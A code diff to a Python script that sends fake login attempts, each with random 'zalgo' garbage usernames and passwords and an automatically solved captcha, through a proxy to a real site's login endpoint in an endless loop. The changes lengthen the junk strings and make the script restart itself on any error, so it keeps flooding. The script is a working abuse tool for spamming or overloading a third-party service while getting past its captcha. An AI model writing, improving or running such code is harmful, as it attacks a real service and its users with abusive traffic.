@@ -9,6 +9,7 @@ import os
 import asyncio
 import dotenv
 import details_generator as DG
+import sys
 
 dotenv.load_dotenv()
 
@@ -32,11 +33,11 @@ def captcha_solve():
 
 
 def send_req():
-    limit = 8
+    limit = 20
     r = requests.Session()
     url = "https://entrar.in/login/auth"
-    user = DG.rand_user(limit)
-    password = DG.rand_pass(limit)
+    user = DG.rand_zalgo_user(limit)
+    password = DG.rand_zalgo_pass(limit)
     captcha = captcha_solve()
     payload = {"username": user, "password": password, "captcha": str(captcha)}
     req1 = r.post(url, data=payload, proxies=proxy, timeout=5)
@@ -49,10 +50,11 @@ threads = []
 def run():
     t = threading.Thread(target=send_req())
     t.start()
-    
-
 
 
 if __name__ == "__main__":
     while True:
-        run()
+        try:
+            run()
+        except:
+            os.execv(sys.argv[0], sys.argv)
